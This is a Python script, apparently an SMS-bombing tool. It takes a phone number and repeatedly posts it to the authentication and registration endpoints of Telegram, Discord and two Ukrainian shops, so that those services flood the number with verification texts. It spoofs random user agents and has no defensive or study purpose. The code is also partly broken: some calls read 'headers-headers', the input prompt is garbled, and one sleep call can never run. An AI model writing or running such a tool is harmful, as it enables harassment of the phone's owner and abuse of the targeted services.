import requests, fake_useragent, time

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input('Beeante HOMep tenedona: (6es +)')



while True:
 try:
     print("Отправлено")
     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print("Не доставлено")
#Телеграм
 try:
     print('Отправлено')
     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
 try:
     print('Отправлено')
     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')
 try:
     print('Отправлено')
     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
 try:
     print('Отправлено')
     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')
#Дискорд
 try:
     print('Отправлено')
     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
 try:
     print('Отправлено')
     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')	 
 try:
     print('Отправлено')
     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
 try:
     print('Отправлено')
     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')
#megasport.ua
 try:
     print('Отправлено')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
 try:
     print('Отправлено')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers-headers, data={'phone' : NUMBER})
 except:
     print('Не доставлено')
 try:
     print('Отправлено')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
 try:
     print('Отправлено')
     response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone' :  NUMBER})
 except:
     print('Не доставлено')

     time.sleep(5000)